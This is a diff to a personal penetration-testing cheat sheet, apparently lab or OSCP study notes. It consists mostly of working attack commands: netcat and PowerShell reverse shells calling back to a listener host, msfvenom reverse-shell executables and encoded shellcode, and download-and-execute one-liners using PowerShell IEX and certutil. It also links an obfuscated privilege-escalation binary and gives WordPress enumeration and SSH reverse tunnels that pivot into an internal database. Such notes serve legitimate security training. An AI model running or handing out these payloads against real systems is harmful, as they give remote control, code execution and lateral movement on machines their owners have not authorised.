@@ -16,6 +16,7 @@ Basically, we are sending our own shell over to the operator
 - Operator now has control of clients shell
 
 #### Netcat reverse shell
+
 ```sh
 nc <listening_host> <listening_port> -e /bin/bash
 ```
@@ -35,6 +36,12 @@ powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.1
 
 ```sh
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.194',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+#### MSFvenom stageless reverse shell payload
+
+```sh
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.194 LPORT=80 -f exe > shell.exe
 ```
 ## Buffer overflows
 
@@ -104,7 +111,6 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<listening_host> LPORT=<listening_po
 ```
 
 #### Fnstenv mov
-
 ```sh
 msfvenom -p windows/shell_reverse_tcp LHOST=<listening host> LPORT=<listening port> -f c -e x86/fnstenv_mov -b "\x00\x0a\x0d\xff\x3b\x45..."
 ```
@@ -150,6 +156,14 @@ One line form:
 ##### Executing code in memory 
 ```powershell
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"
+```
+
+#### Curtutil
+
+If you don't have powershell access:
+
+```cmd
+certutil.exe -urlcache -split -f "http://10.10.14.17/nc.exe" c:\temp\nc.exe
 ```
 
 ### Windows to linux
@@ -482,6 +496,14 @@ C:\> accesschk.exe -ucqv upnphost
 ```
 
 This guide is useful: https://www.fuzzysecurity.com/tutorials/16.html
+
+#### WinPEAS
+
+Windows privelege escalation checker [Link](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe)
+
+
+
+
 ### Linux
 
 Can use linux priv esc checker.
@@ -795,3 +817,40 @@ corp\fakeuser
 ```sh
 hash-identifier AAFDC23870ECBCD3D557B6423A8982134E17927E
 ```
+
+## Wordpress scanning
+
+The following command saves the output to a file `sandbox-wpscan`
+
+```sh
+wpscan --url sandbox.local --enumerate ap,at,cb,dbe -o sandbox-wpscan -f cli-no-color
+```
+
+## Tunneling
+
+### SSH tunnel
+
+To create a tunnel with a middle-machine that can access both internal network and external network where the attacking machine's IP is `192.168.119.194` and the IP for the internal database is `10.5.5.11` (with ports 22 and 3306 open) and the remote machine's IP is `10.11.1.250`
+
+On the remote machine, run either:
+
+1. Interactive (allows for password entering)
+    ```sh
+    ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" omar2535@192.168.119.194
+    ```
+or
+
+2. Non-interactive (using SSH key)
+    ```sh
+    ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa omar2535@192.168.119.194
+    ```
+
+where the private key is on the tunnel machine and the public key given to the attacking machine:
+
+`~/.ssh/authorized_keys`
+```sh
+from="10.11.1.250",command="echo 'Only port forwarding allowed'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC94/...
+```
+
+and the ssh service is started using `systemctl start ssh.socket`
+
